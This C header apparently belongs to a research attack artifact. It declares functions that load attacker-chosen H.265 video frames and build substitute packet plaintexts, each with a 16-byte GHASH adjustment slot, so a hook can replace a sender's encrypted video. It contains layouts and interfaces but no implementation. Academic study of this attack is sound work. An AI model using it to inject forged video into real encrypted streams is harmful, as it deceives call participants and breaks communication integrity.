/* adversary_nals — pre-loads and round-robin-dispenses the H.265 NALs
 * that the attack hook substitutes for sender's outgoing video. The
 * layout produced by `build_adversary_plaintext` matches
 * attack/crypto/h265_nal.sage::build_packet_plaintext: a Filler Data
 * NAL absorbs the variable filler length and the 16-byte adjustment
 * slot lives inside it. */

#ifndef ADVERSARY_NALS_H
#define ADVERSARY_NALS_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* One-time load. Reads the H.265 raw stream from `path` (Annex-B with
 * 3- or 4-byte start codes) and stores all NAL units in memory. Safe
 * to call multiple times — subsequent calls are no-ops after the
 * first successful one. Returns 0 on success, negative on error. */
int adversary_nals_load(const char *path);

/* Whether the loader has any NALs ready to dispense. */
int adversary_nals_ready(void);

/* Round-robin pop the next adversary NAL. Returns a pointer into a
 * permanent buffer (do NOT free) plus its length. NAL bytes do NOT
 * include start codes. Returns NULL when no NAL is loaded. */
const uint8_t *adversary_nals_next(size_t *out_len);

/* Build the synthetic plaintext that the adversary substitutes for
 * sender's payload, exactly as the sage `build_packet_plaintext` would.
 *
 * Layout (target_len bytes total, multiple of 16):
 *   [3]               0x00 0x00 0x01 start code
 *   [nal_len]         adversary NAL bytes
 *   [3]               0x00 0x00 0x01 start code
 *   [2]               FD_NUT NAL header 0x4C 0x01 (nal_unit_type=38)
 *   [pad_before]      0xFF filler bytes
 *   [16]              adjustment slot (caller overwrites with GHASH X)
 *   [pad_after]       0xFF filler bytes
 *   [1]               0x80 rbsp_trailing_bits
 *
 * Returns 0 on success and sets *out_adj_off (the 16-byte aligned
 * offset of the adjustment slot within out_buf).
 *
 * Returns -1 if the adversary NAL plus minimum framing does not fit
 * inside target_len — the caller (the hook) should then pass-through
 * sender's original packet (paper Table 3: Fragmentation Unit territory). */
int build_adversary_plaintext(const uint8_t *adversary_nal, size_t nal_len,
                              size_t target_len, uint8_t *out_buf,
                              size_t *out_adj_off);

/* --- RFC 7798 H.265 Aggregation Packet (AP) variant for §5.4.2.1
 * Validity Preservation. ---
 *
 * Loads an IDR-only adversary stream (e.g. produced by ffmpeg with
 * keyint=1:repeat-headers=1). Captures VPS, SPS, PPS once (they're
 * constant across frames in the source) and accumulates every
 * IDR_W_RADL/IDR_N_LP slice into a round-robin list. Returns 0 on
 * success, negative on error. Safe to call multiple times — only
 * the first successful call populates the table. */
int adversary_idr_stream_load(const char *path);

/* Whether the IDR-only stream has been loaded and is ready to dispense. */
int adversary_idr_stream_ready(void);

/* Build a self-contained, independently-decodable AP packet's payload
 * (RFC 7798 §4.4.2). The synthesised RTP payload places one complete
 * H.265 frame inside a single packet so the receiver's depacketizer
 * does not depend on neighbouring packets for context. Layout:
 *
 *   [2]   AP NAL header (Type=48, F=0, LayerId=0, TID=1)
 *   [2]   VPS size (big endian)
 *   [...] VPS NAL bytes
 *   [2]   SPS size
 *   [...] SPS NAL bytes
 *   [2]   PPS size
 *   [...] PPS NAL bytes
 *   [2]   IDR size
 *   [...] IDR slice NAL bytes (cycled round-robin)
 *   [2]   FD_NUT size
 *   [2]   FD_NUT NAL header 0x4C 0x01
 *   [n]   0xFF filler
 *   [16]  adjustment slot (caller overwrites with GHASH X)
 *   [n']  0xFF filler
 *   [1]   0x80 rbsp_trailing_bits
 *
 * The adjustment slot is placed at the smallest 16-byte aligned offset
 * inside the FD_NUT NAL. Returns 0 on success, -1 if target_len is
 * too small to accommodate one IDR frame + alignment. */
int build_adversary_ap_plaintext(size_t target_len, uint8_t *out_buf,
                                 size_t *out_adj_off);

#ifdef __cplusplus
}
#endif

#endif /* ADVERSARY_NALS_H */
